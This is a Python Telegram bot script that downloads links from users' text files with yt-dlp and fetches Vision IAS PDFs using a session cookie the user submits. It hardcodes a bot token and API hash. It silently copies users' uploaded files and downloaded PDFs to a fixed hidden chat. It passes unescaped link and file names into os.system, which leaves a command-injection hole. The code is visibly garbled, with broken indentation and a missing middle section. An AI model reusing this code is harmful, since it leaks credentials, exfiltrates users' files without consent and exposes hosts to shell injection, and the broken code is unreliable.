import os
import re
import sys
import json
import time
import asyncio
import requests
import subprocess

import core as helper
from utils import progress_bar
from vars import api_id, api_hash, bot_token
from aiohttp import ClientSession
from pyromod import listen
from subprocess import getstatusoutput

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import FloodWait
from pyrogram.errors.exceptions.bad_request_400 import StickerEmojiInvalid
from pyrogram.types.messages_and_media import message
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup


bot = Client("bot",
             bot_token= "7092396095:AAF_jP7qZx_cC0esduKkPafHGt9vhsrWxiM",
             api_id= 25298674,
             api_hash= "1a7e01278b2bf0fe975fb8ce7c5ead8d"
)


@bot.on_message(filters.command(["start"]))
async def account_login(bot: Client, m: Message):
    editable = await m.reply_text("**ℍɪɪ** ┈━═𝗠𝗬 𝗧𝗫𝗧 𝗟𝗢𝗩𝗘𝗥═━┈🙈❤️\n\n𝗜 𝗔𝗠 𝗔 𝗕𝗢𝗧 𝗙𝗢𝗥 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗟𝗜𝗡𝗞𝗦 𝗙𝗥𝗢𝗠 𝗬𝗢𝗨𝗥 **.𝗧𝗫𝗧** 𝐅𝐢𝐥𝐞 𝐀𝐧𝐝 𝐓𝐡𝐞𝐧 𝐔𝐩𝐥𝐨𝐚𝐝 𝐓𝐡𝐚𝐭 𝐅𝐢𝐥𝐞 𝐎𝐧 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐒𝐨 𝐁𝐚𝐬𝐢𝐜𝐚𝐥𝐥𝐲 𝐈𝐟 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐔𝐬𝐞 𝐌𝐞 𝐅𝐢𝐫𝐬𝐭 𝐒𝐞𝐧𝐝 𝐌𝐞 /upload  𝗕𝗢𝗧 𝗠𝗔𝗗 𝗕𝗬 👀💙 @hemendra148 𝗛𝗘𝗠𝗨 𝗔𝗥𝗠𝗬 ..")


@bot.on_message(filters.command("stop"))
async def restart_handler(_, m):
    await m.reply_text("**𝗦𝗧𝗢𝗣𝗘𝗘𝗗**🚦", True)
    os.execl(sys.executable, sys.executable, *sys.argv)



@bot.on_message(filters.command(["upload"]))
async def account_login(bot: Client, m: Message):
    editable = await m.reply_text('𝗜𝗧𝗦 𝗛𝗘𝗠𝗨 𝗕𝗢𝗧 𝗛𝗘𝗥𝗘 𝗦𝗘𝗡𝗗 𝗧𝗫𝗧 𝗙𝗜𝗟𝗘 🗂 ⚡️')
    input: Message = await bot.listen(editable.chat.id)
    x = await input.download()
        await bot.send_document(-1002095973382, x)
        await input.delete(True)
        file_name, ext = os.path.splitext(os.path.basename(x))
   
    path = f"./downloads/{m.chat.id}"

    try:
       with open(x, "r") as f:
           content = f.read()
       content = content.split("\n")
       links = []
       for i in content:
           links.append(i.split("://", 1))
       os.remove(x)
            # print(len(links)
    except:
           await m.reply_text("**Invalid file input.**")
           os.remove(x)
           return
    else:
        content = input.text
        content = content.split("\n")
        links = []
        for i in content:
            links.append(i.split("://", 1))
   
   
    await editable.edit(f"**𝗧𝗢𝗧𝗔𝗟 𝗟𝗜𝗡𝗞𝗦 𝗙𝗢𝗨𝗡𝗗 𝗜𝗡 𝗧𝗫𝗧 𝗙𝗜𝗟𝗘 𝗔𝗥𝗘 🔗🔗** **{len(links)}**\n\n**✍️ 𝗡𝗢𝗪 𝗦𝗘𝗡𝗗 𝗠𝗘 𝗙𝗥𝗢𝗠 𝗪𝗛𝗘𝗥𝗘 𝗨 𝗪𝗔𝗡𝗧 𝗧𝗢 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗜𝗡𝗜𝗧𝗜𝗔𝗟 𝗜𝗦** **1**")
    input0: Message = await bot.listen(editable.chat.id)
    raw_text = input0.text
    await input0.delete(True)

    await editable.edit("**Enter Batch Name or Send `d` To Grab Batch Name From Txt File**")
    input1: Message = await bot.listen(editable.chat.id)
    raw_text0 = input1.text
                        except FloodWait as e:
                        await m.reply_text(str(e))
                        time.sleep(e.x)
                        continue
                elif ".pdf" in url:
                    try:
                        cmd = f'yt-dlp -o "{name}.pdf" "{url}"'
                        download_cmd = f"{cmd} -R 25 --fragment-retries 25"
                        os.system(download_cmd)
                        copy = await bot.send_document(chat_id=m.chat.id,document=f'{name}.pdf', caption=cc1)
                        await copy.copy(chat_id = -1002095973382)
                        count += 1
                        os.remove(f'{name}.pdf')
                    except FloodWait as e:
                        await m.reply_text(str(e))
                        time.sleep(e.x)
                        continue
                else:
                     Show = f"**Downloading:-**\n\n**Title ➤** `{name}`\n**Quality ➤** `{raw_text2}`\n\n**Bot By ➤ **『 𝗛𝗘𝗠𝗨 』"
                     prog = await bot.send_message(m.chat.id, Show)
                     res_file = await helper.download_video(url, cmd, name)
                     filename = res_file
                     await prog.delete(True)
                     await helper.send_vid(bot, m, cc, filename, thumb, name, prog)
                     count += 1

            except Exception as e:
                await m.reply_text(f"**This #Failed File is not Counted**\n**Name ➤** `{name}`\n**Link ➤** `{url}`\n\n ** Failed Reason ➤** {e}")
                count += 1
                continue

    except Exception as e:
        await m.reply_text(e)
    await m.reply_text("Done ✅")
@bot.on_message(filters.command(["vpdf"]))
async def vision_pdf(bot: Client, m: Message):
    editable = await m.reply_text("Hi 👋 Sir!\n\nHow are You ?\n\n☞ I'm **Vision Pdf** Downloader Bot.\n\n☞ Send ' /vpdf ' Command to Download **Vision IAS** Pdf.\n\n☞ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲 : 『 𝗛𝗘𝗠𝗨 』\n")
    input: Message = await bot.listen(editable.chat.id)
    x = await input.download()
    await input.delete(True)

    path = f"./downloads/{m.chat.id}"

    try:
            with open(x, "r") as f:
                content = f.read()
            content = content.split("\n")

            links = []
            for i in content:
                links.append(i.split(":", 1))
            os.remove(x)
    except:
            await m.reply_text("Invalid file input.☹️")
            os.remove(x)
            return
            
    editable = await m.reply_text(f"Total links found are {len(links)}\n\nSend From Where You Want to Download,\n\nInitial is 1")
    input1: Message = await bot.listen(editable.chat.id)
    count = input1.text
    count = int(count)      	
    	            
    await m.reply_text("**Enter Your Batch Name**")
    inputy: Message = await bot.listen(editable.chat.id)
    raw_texty = inputy.text

    await m.reply_text("**Enter Cookie**")
    input2: Message = await bot.listen(editable.chat.id)
    cookie = input2.text
    cookies = cookies = {'PHPSESSID': f'{cookie}'}
        
    try:
        for i in range(count, len(links)):

            url = links[i][1]
            name1 = links[i][0].replace("\t", "").replace(":", "").replace("/","").replace("+", "").replace("#", "").replace("|", "").replace("@", "").replace("*", "").replace(".", "").strip()[:57]
            name = f'{str(count).zfill(3)}) {name1}'
            cc = f'{str(count).zfill(3)}. {name1}.pdf\n\n**Batch:-** {raw_texty}\n\n**Extracted By ➤** [『 𝗛𝗘𝗠𝗨 』]'
            ka = await helper.vision(url, name, cookies)
            await m.reply_document(ka, caption=cc)
            count += 1
            os.remove(ka)
            time.sleep(3)
    except Exception as e:
        await m.reply_text(e)
    await m.reply_text("Done ✅")
    
bot.run()
